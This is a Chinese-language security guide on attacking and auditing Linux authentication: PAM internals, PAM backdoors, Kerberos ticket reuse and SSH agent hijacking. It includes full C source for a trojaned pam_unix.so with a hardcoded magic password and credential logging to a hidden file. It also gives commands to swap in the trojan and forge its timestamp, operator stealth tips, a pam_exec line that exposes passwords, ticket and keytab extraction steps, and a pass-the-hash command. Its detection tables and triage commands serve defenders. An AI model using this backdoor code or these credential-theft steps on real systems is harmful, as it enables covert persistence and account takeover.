## 1. PAM可插拔认证模块安全攻防

### 1.1 PAM基础原理

#### 1.1.1 配置文件与模块路径

- **Solaris 和基于 UNIX 的系统** 通常使用位于 `/etc/pam.conf` 的中央配置文件。
- **Linux 系统** 倾向于使用目录方式，将特定服务的配置存储在 `/etc/pam.d` 中。例如，登录服务的配置文件位于 `/etc/pam.d/login`。

`module-path` 可以是**绝对路径**（`/usr/lib/security/pam_custom.so`）或相对于默认 PAM 模块目录的**相对路径**。在现代 Linux 系统上，实际目录通常是 `/lib/security`、`/lib64/security`、`/usr/lib/security` 或多架构路径如 `/usr/lib/x86_64-linux-gnu/security`。

#### 1.1.2 四大管理领域与模块控制

**四大管理领域**：

| 领域 | 功能 |
|:---|:---|
| **auth** | 验证用户身份，通常通过提示输入密码 |
| **account** | 处理账户验证，检查组成员资格或时间限制等条件 |
| **password** | 管理密码更新，包括复杂性检查或防止字典攻击 |
| **session** | 管理服务会话开始或结束时的操作，如挂载目录或设置资源限制 |

**模块控制标志**：

| 控制标志 | 说明 |
|:---|:---|
| **required** | 必需模块的失败会导致最终失败，但只有在检查完所有后续模块之后 |
| **requisite** | 失败时立即终止过程 |
| **sufficient** | 成功则绕过同一领域的其余检查，除非后续模块失败 |
| **optional** | 仅在它是栈中唯一模块时才导致失败 |

#### 1.1.3 认证流程与堆叠机制

PAM 登录服务配置示例：

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

**攻击语义要点**：

在植入 PAM 后门时，**插入规则的位置**通常比有效载荷本身更重要：

- `include` 和 `substack` 从其他文件拉取规则，因此编辑 `sshd` 可能只影响 SSH，而编辑 `system-auth`、`common-auth` 或其他共享栈会影响多个服务。
- PAM 还支持括号控制，如 `[success=1 default=ignore]`。这些可以被滥用来在成功的自定义检查后**跳过一个或多个模块**，而不是明显地替换 `pam_unix.so`。

操作人员快速要点：在修补之前始终映射**完整的服务图**。例如，某些发行版上的 `sshd -> password-auth -> system-auth` 或其他发行版上的 `sshd -> system-remote-login -> system-login -> system-auth` 意味着同一行植入可能传播得比预期更广。

**示例场景**：

在具有多个认证模块的设置中，过程遵循严格的顺序。如果 `pam_securetty` 模块发现登录终端未授权，root 登录将被阻止，但由于其"required"状态，所有模块仍会被处理。`pam_env` 设置环境变量，可能有助于用户体验。`pam_ldap` 和 `pam_unix` 模块协同工作以认证用户，其中 `pam_unix` 尝试使用先前提供的密码，增强了认证方法的效率和灵活性。

### 1.2 PAM后门攻击与检测

#### 1.2.1 钩取pam_unix.so（攻击手法与检测）

**攻击原理**：

在高价值 Linux 环境中，一种经典的持久化技巧是**用木马化的替代品替换合法的 PAM 库**。因为每个 SSH/控制台登录最终都会调用 `pam_unix.so:pam_sm_authenticate()`，几行 C 代码就足以捕获凭据或实现*魔术*密码绕过。

**攻击代码**：

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user, *pass;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* 魔术密码 → 立即成功 */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* 凭据收集 */
    int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
    dprintf(fd, "%s:%s\n", user, pass);
    close(fd);

    /* 回退到原始函数 */
    if(!orig) {
        orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
    }
    return orig(pamh, flags, argc, argv);
}
```

**编译与隐蔽替换**：

```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # 保持原始权限
touch -r /bin/ls /lib/security/pam_unix.so  # 时间戳篡改
```

**操作安全提示**：
1. **原子覆盖** – 写入临时文件然后 `mv` 到目标位置，避免半写入库导致 SSH 锁定。
2. 日志文件放置如 `/usr/bin/.dbus.log` 与合法桌面工件混合。
3. 保持符号导出相同（`pam_sm_setcred` 等）以避免 PAM 行为异常。

**检测方法**：

| 检测手段 | 命令 |
|:---|:---|
| 哈希比对 | 比较 `pam_unix.so` 的 MD5/SHA256 与发行版软件包 |
| 包管理器验证 | `rpm -V pam` 或 `debsums -s libpam-modules` |
| 权限检查 | 检查 `/lib/security/` 下是否有全局可写或异常所有权的文件 |
| auditd监控 | `-w /lib/security/pam_unix.so -p wa -k pam-backdoor` |
| 异常模块搜索 | `grep -R "pam_[a-z].*\.so" /etc/pam.d/ \| grep -v pam_unix` |

#### 1.2.2 滥用pam_exec持久化（攻击手法与检测）

**攻击手法**：

与其替换 `pam_unix.so`，更轻量的方法是在 `/etc/pam.d/sshd` 中追加一行 `pam_exec`，使每次 SSH 登录都启动植入程序，同时保持正常栈不变：

```bash
# 在成功认证时运行，并在 stdin 上接收输入的密码
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```

`pam_exec` 通过环境变量接收 PAM 元数据，如 `PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY` 和 `PAM_TYPE`。使用 `expose_authtok` 时，辅助程序还可以在 `auth` 或 `password` 阶段从 `stdin` 读取密码。

**检测要点**：

- 检查 `/etc/pam.d/` 下是否存在异常的 `pam_exec.so` 配置
- 审计 `/usr/local/bin/` 等路径下的可疑脚本
- 关注 `expose_authtok` 参数的滥用

#### 1.2.3 authselect持久化（攻击手法与检测）

**攻击手法**：

在 RHEL、CentOS Stream、Fedora 及其衍生系统上，直接编辑生成的文件如 `/etc/pam.d/system-auth` 可能会被 **`authselect` 覆盖**。为了持久化，操作人员通常修补 `/etc/authselect/custom/<profile>/` 下的活动自定义配置文件，然后重新选择或应用它。

**典型工作流程**：

```bash
# 首先检查活动配置文件
authselect current

# 如果已存在自定义配置文件，编辑其 PAM 模板而非直接编辑 system-auth
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# 修改模板文件后重新应用配置文件
authselect select custom/<profile>
```

**检测要点**：

- 如果 `/etc/pam.d/system-auth` 包含横幅 `Generated by authselect` 和 `Do not modify this file manually`，真正的持久化点可能位于 `/etc/authselect/custom/` 而非 `/etc/pam.d/`
- 定期检查 `authselect current` 输出与预期配置是否一致

#### 1.2.4 Plague后门变种（攻击手法与检测）

**攻击手法**：

2025 年关于 **Plague** Linux 后门的报道展示了同一核心思想的进一步发展：一个具有**静态绕过密码**的恶意 PAM 组件，加上清理 SSH 相关的环境变量和 shell 历史（`HISTFILE=/dev/null`）以减少登录后的会话痕迹。

**检测要点**：

- 这是一个有用的狩猎模式，因为后门逻辑可能存在于 PAM 中，而隐蔽工件仅在认证成功**之后**才会出现
- 关注登录后环境变量的异常清理行为
- 结合审计日志分析认证成功后的会话行为

### 1.3 PAM配置漏洞挖掘与审计

#### 1.3.1 认证链裸奔（漏洞案例与审计方法）

**漏洞案例**：

```bash
auth        required    pam_custom.so
account     required    pam_custom.so
```

**风险**：完全依赖自研模块。一旦 `pam_custom.so` 因 bug 崩溃或返回错误码，**所有用户（包括 root）永久锁死在门外**。且未调用 `pam_unix.so`，相当于绕过了系统 Shadow 密码的加固机制。

**审计方法**：
- 检查是否保留 `pam_unix.so` 作为 `required` 的最后一道防线
- 确认认证链中有系统密码兜底

#### 1.3.2 控制标志误用（漏洞案例与审计方法）

**漏洞案例**：

```bash
auth        sufficient  pam_google_authenticator.so
auth        required    pam_unix.so
```

**风险**：如果谷歌认证器因网络超时返回 `PAM_SUCCESS`，则直接跳过系统密码校验。攻击者可利用服务不可用状态**无密码登录**。

**审计方法**：
- `sufficient` 只应放在 `required` **之后**作为"附加跳过条件"
- 检查关键认证模块是否被 `sufficient` 前置

#### 1.3.3 账户锁定缺失（漏洞案例与审计方法）

**漏洞案例**：仅包含 `pam_unix.so`，未添加 `pam_tally2` 或 `pam_faillock`。

```bash
auth        required    pam_unix.so
```

**风险**：攻击者可无限尝试 SSH 密码，无任何锁定机制。

**审计方法**：

检查是否在 `pam_unix.so` 之前插入：

```bash
auth        required    pam_faillock.so preauth silent deny=5 unlock_time=300
auth        required    pam_unix.so
auth        [default=die] pam_faillock.so authfail deny=5
```

#### 1.3.4 权限控制过松（漏洞案例与审计方法）

**漏洞案例**：

```bash
chmod 644 /etc/pam.d/system-auth
```

**风险**：普通用户可读取认证顺序、模块参数，为定向攻击提供情报。

**审计方法**：
- PAM 配置目录权限应为 `755`，文件权限应为 `644`，所有者必须为 root
- 更严苛可设为 `640`

#### 1.3.5 参数传递漏洞（漏洞案例与审计方法）

**漏洞案例**：

```bash
auth        required    pam_unix.so    nullok
```

**风险**：`nullok` 允许空密码登录。

**审计方法**：
- 生产环境严禁使用 `nullok`
- 检查是否误用 `debug` 参数向日志输出敏感信息

### 1.4 自定义PAM模块漏洞挖掘

#### 1.4.1 逆向分析要点

| 检测项 | 方法 | 关注指标 |
|:---|:---|:---|
| 硬编码凭证 | `strings` 命令快速扫描 | 明文密码、API Key、固定 Token |
| 逻辑旁路 | 反汇编 `pam_sm_authenticate` | "万能后门"、特定用户名直接返回 `PAM_SUCCESS` |
| 输入过滤缺陷 | 检查密码字符串处理 | 是否调用 `strcpy` 而非 `strncpy` |
| 不安全系统调用 | 搜索 `system()` 或 `popen()` | 拼接用户输入执行 Shell 命令 |
| 密码存储算法 | 检查加密实现 | 是否使用弱算法（MD5、Base64） |

#### 1.4.2 运行时污染测试

| 测试项 | 方法 |
|:---|:---|
| **LD_PRELOAD 劫持** | 测试能否通过环境变量预加载恶意库，覆盖 PAM 调用的标准函数 |
| **核心转储泄露** | 强制让 PAM 模块崩溃（如发送超长用户名），检查是否生成 core 文件，可能泄露内存中的密码片段 |

### 1.5 PAM后门快速分诊命令

```bash
# 1) 发现异常 PAM 对象
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) 验证软件包完整性
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) 识别非打包的 PAM 模块
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) 查找隐蔽的配置编辑
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

## 3. Kerberos票据利用

### 3.1 传递票据（Pass The Ticket）

CCache票据格式可以转换为Kirbi（Windows中需要的格式）以执行PTT攻击。

### 3.2 从/tmp重用CCACHE票据

CCACHE文件是**存储Kerberos凭据**的二进制格式，通常以600权限存储在`/tmp`中。这些文件可以通过其**名称格式`krb5cc_%{uid}`**来识别。

```bash
# 查找票据
ls /tmp/ | grep krb5cc
krb5cc_1000

# 准备使用它
export KRB5CCNAME=/tmp/krb5cc_1000
```

### 3.3 从密钥环重用CCACHE票据

存储在进程内存中的Kerberos票据可以被提取，特别是在机器的ptrace保护被禁用时（`/proc/sys/kernel/yama/ptrace_scope`）。使用 [tickey](https://github.com/TarlogicSecurity/tickey) 工具可提取票据：

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

### 3.4 从SSSD KCM重用CCACHE票据

SSSD在路径`/var/lib/sss/secrets/secrets.ldb`维护数据库副本，对应密钥存储在`/var/lib/sss/secrets/.secrets.mkey`。

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

### 3.5 从keytab重用CCACHE票据

```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```

### 3.6 从/etc/krb5.keytab提取帐户

服务帐户密钥安全地存储在**`/etc/krb5.keytab`**文件中。使用`klist`检查keytab文件内容，使用`KeyTabExtract`提取RC4 HMAC哈希：

```bash
python3 keytabextract.py krb5.keytab
```

利用提取的帐户和哈希信息，可以使用`crackmapexec`等工具建立连接：

```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```

## 4. SSH代理转发劫持

### 4.1 原理与利用

如果您在 `/etc/ssh_config` 或 `$HOME/.ssh/config` 配置中发现以下内容：

```
ForwardAgent yes
```

如果您是机器上的root，您可能可以**访问您能在 _/tmp_ 目录中找到的任何代理建立的ssh连接**。

有用的套接字查找命令：

```bash
ls -la /run/user/*/ssh-* /tmp/ssh-* 2>/dev/null
find /run/user /tmp -type s -name 'agent.*' 2>/dev/null
```

使用Bob的一个ssh-agent来冒充Bob：

```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```

**为什么这能奏效？**

当您设置变量 `SSH_AUTH_SOCK` 时，您正在访问Bob在ssh连接中使用的密钥。然后，如果他的私钥仍然在那里（通常会是），您将能够使用它访问任何主机。

由于私钥是以未加密形式保存在代理的内存中，如果您是Bob但不知道私钥的密码，您仍然可以访问代理并使用它。

另一个选项是，代理的所有者和root可能能够访问代理的内存并提取私钥。
